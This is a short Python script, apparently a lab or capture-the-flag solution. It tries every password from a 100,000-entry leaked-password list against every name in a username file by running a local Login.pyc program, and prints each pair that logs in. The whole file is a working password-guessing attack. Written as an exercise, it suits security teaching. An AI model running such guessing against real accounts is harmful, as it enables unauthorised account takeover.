import time
import subprocess
import hashlib

def main():
    start_time = time.time()
    passwords = set()
    gang_names = set()

    with open("PwnedPWs100k.txt") as pw_file:  # Assuming the file extension is .txt
        passwords.update(line.strip() for line in pw_file)

    with open("gang.txt") as gang_file:  # Assuming the file extension is .txt
        gang_names.update(line.strip() for line in gang_file)
        gang_names.discard("Bonnie")
        gang_names.discard("Adam")

    for password in passwords:
        for name in gang_names:
            result2 = subprocess.run(['python3', 'Login.pyc', name, password], capture_output=True, text=True)
            if "success" in result2.stdout:
                print(name, password)
                break

    end_time = time.time()
    elapsed_time = end_time - start_time
    print(elapsed_time)

if __name__ == "__main__":
    main()
